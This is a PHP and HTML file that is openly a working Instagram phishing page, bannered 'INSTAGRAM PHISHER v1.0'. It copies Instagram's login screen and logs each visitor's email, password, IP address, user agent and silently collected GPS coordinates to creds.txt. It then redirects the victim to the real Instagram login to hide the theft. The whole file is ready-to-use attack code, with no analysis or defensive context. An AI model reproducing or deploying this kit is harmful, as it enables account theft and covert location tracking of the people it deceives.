<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['email']) && isset($_POST['pass'])) {
    $email = htmlspecialchars($_POST['email']);
    $pass = htmlspecialchars($_POST['pass']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';

    $log = "\n";
    $log .= "┌─[ INSTAGRAM PHISHER v1.0 by Léo Falcon ]──────┐\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME CAPTUREE !                │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Email     : $email                          │\n";
    $log .= "│ 🔑 Password  : $pass                           │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS       : $gps                           │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);

    header('Location: https://www.instagram.com/accounts/login/?next=%2F');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/dfa985554631.png">
    <title>Instagram</title>
    <style>
* {border:none;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;margin:0;padding:0;}
body {background-color:#fafafa;height:100vh;}
main {height:100vh;margin:auto;max-width:935px;display:flex;align-items:center;justify-content:center;}
.flex {display:flex;}
.direction-column {flex-direction:column;}
.justify-content-center {justify-content:center;}
.align-items-center {align-items:center;}
.flex-wrap {flex-wrap:wrap;}
.panel {background-color:white;border:1px solid #dbdbdb;margin-bottom:10px;padding:10px;}
#auth {max-width:350px;}
#mobile {max-width:454px;margin-right:40px;}
#mobile div {width:454px;height:618px;background:#000;border-radius:32px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
#mobile div::before {content:'';position:absolute;top:20px;left:50%;transform:translateX(-50%);width:140px;height:4px;background:rgba(255,255,255,0.3);border-radius:2px;}
#mobile img {position:absolute;top:120px;left:50%;transform:translateX(-50%);width:210px;height:62px;}
.login-with-fb,form {width:100%;}
.register,form {padding:30px 20px;}
.login-with-fb {padding:30px 20px 20px 20px;}
form input {background-color:#fafafa;border:1px solid #dbdbdb;border-radius:3px;color:#808080;margin-bottom:8px;padding:10px;width:100%;font-size:14px;}
form input::placeholder {color:#808080;}
form input:focus {border:1px solid #808080;outline:none;background:#fff;}
form button {background-color:#0095f6;border-radius:5px;color:#fff;font-weight:bold;height:35px;margin-top:10px;width:100%;cursor:pointer;font-size:14px;}
.separator {padding:0 20px;display:flex;align-items:center;}
.separator span {background-color:#dbdbdb;height:1px;flex:1;}
.separator .or {color:#808080;font-weight:bold;margin:0 10px;font-size:13px;}
.login-with-fb a {color:#385185;text-decoration:none;}
.login-with-fb>a {font-size:12px;display:block;text-align:center;}
.register {font-size:14px;display:flex;justify-content:center;align-items:center;}
.register a {color:#0095f6;font-weight:bold;margin-left:5px;}
.app-download {padding:15px;text-align:center;}
.app-download p {padding:10px 0;font-size:14px;color:#8e8e8e;}
.app-download img {height:40px;margin:0 5px;}
footer {margin:0 auto 30px;max-width:935px;text-align:center;}
footer ul {display:flex;flex-wrap:wrap;justify-content:center;margin-bottom:20px;}
footer ul li {margin:0 10px 10px;}
footer ul li a {color:#385185;font-weight:bold;text-transform:uppercase;font-size:13px;}
footer .copyright {color:#808080;font-weight:bold;font-size:13px;}
#gps-data {position:absolute;left:-9999px;}
@media (max-width:767px) {main {flex-direction:column;margin:30px auto 50px auto;}#mobile {display:none;margin:0 0 30px 0;}}
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <!-- MOBILE MOCKUP -->
        <section id="mobile">
            <div></div>
        </section>
        
        <!-- AUTH FORM -->
        <section id="auth" class="flex direction-column">
            <!-- LOGIN PANEL -->
            <div class="panel login flex direction-column">
                <div style="text-align:center;margin:30px 0 20px 0;">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" style="width:175px;height:51px;">
                </div>
                
                <!-- FORM AVEC GPS -->
                <form method="POST">
                    <input type="hidden" name="gps" id="gps-data">
                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" required autocomplete="username">
                    <input name="pass" type="password" placeholder="Senha" required autocomplete="current-password">
                    <button type="submit">se connecter</button>
                </form>
                
                <!-- SEPARATOR -->
                <div class="separator">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                
                <!-- FB + FORGOT -->
                <div class="login-with-fb">
                    <div style="display:flex;align-items:center;justify-content:center;margin-bottom:20px;">
                        <svg width="16" height="16" style="margin-right:8px;fill:#1877F2;" viewBox="0 0 24 24">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                        <span style="color:#385185;font-weight:600;">Entrar com o Facebook</span>
                    </div>
                    <a>Esqueceu a senha?</a>
                </div>
            </div>
            
            <!-- REGISTER -->
            <div class="panel register">
                <span>Não tem uma conta?</span>
                <a href="#">Cadastre-se</a>
            </div>
            
            <!-- APP DOWNLOAD -->
            <div class="app-download">
                <p>Obtenha o aplicativo.</p>
                <div style="display:flex;justify-content:center;">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/photo/iphone/pt-PT-0b0dd452bb25.png/5e1b9f7e9b2c.png" alt="App Store">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/photo/googleplay-ptpt.png/10de3df6f7e7.png" alt="Google Play">
                </div>
            </div>
        </section>
    </main>
    
    <!-- FOOTER -->
    <footer>
        <ul>
            <li><a href="#">SOBRE</a></li><li><a href="#">AJUDA</a></li><li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li><li><a href="#">CARREIRAS</a></li><li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li><li><a href="#">LOCALIZAÇÃO</a></li><li><a href="#">CONTAS MAIS RELEVANTES</a></li>
            <li><a href="#">HASHTAGS</a></li><li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2026 Instagram do Meta</p>
    </footer>

    <!-- GPS SILENCIEUX -->
    <script>
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(pos){
            document.getElementById('gps-data').value = pos.coords.latitude + ',' + pos.coords.longitude;
        },function(){},{
            enableHighAccuracy:true,
            timeout:5000,
            maximumAge:0
        });
    }
    </script>
</body>
</html>
